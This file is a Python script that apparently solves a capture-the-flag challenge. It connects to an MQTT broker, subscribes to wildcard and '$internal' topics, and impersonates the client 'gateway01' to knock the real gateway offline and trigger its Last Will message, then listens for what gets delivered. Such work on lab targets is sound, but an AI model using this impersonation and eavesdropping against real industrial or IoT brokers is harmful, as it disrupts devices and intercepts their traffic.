#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time, threading, sys

HOST = "0.cloud.chals.io"; PORT = 16792
WATCH = ["$internal/#", "plant/gateway/#", "plant/+/heartbeat_lost", "#"]

def on_connect(c, u, f, rc, props=None):
    print("[watcher] connected", rc, flush=True)
    for t in WATCH:
        c.subscribe(t, 0)

def on_message(c, u, msg):
    p = msg.payload.decode('utf-8', 'replace')
    print(f"[watcher MSG] {msg.topic} retain={msg.retain}: {p}", flush=True)

watcher = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="watcher-"+str(int(time.time())))
watcher.on_connect = on_connect
watcher.on_message = on_message
watcher.connect(HOST, PORT, 30)
watcher.loop_start()

print("[*] watcher running; will bump gateway01 in 3s", flush=True)
time.sleep(3)

# Impersonate the gateway to kick the real one off -> triggers its Last Will
imp = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="gateway01")
imp.connect(HOST, PORT, 30)
imp.loop_start()
print("[*] connected as gateway01 (should have bumped real gateway)", flush=True)
time.sleep(8)
imp.disconnect()

print("[*] reconnecting impersonator briefly to watch will delivery", flush=True)
watcher2 = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="w2-"+str(int(time.time())))
watcher2.on_message = on_message
def oc2(c,u,f,rc,props=None):
    print("[watcher2] connected", rc, flush=True)
    for t in WATCH:
        c.subscribe(t,0)
watcher2.on_connect = oc2
watcher2.connect(HOST, PORT, 30)
watcher2.loop_start()
time.sleep(12)
watcher2.loop_stop(); watcher2.disconnect()
watcher.loop_stop(); watcher.disconnect()
print("done")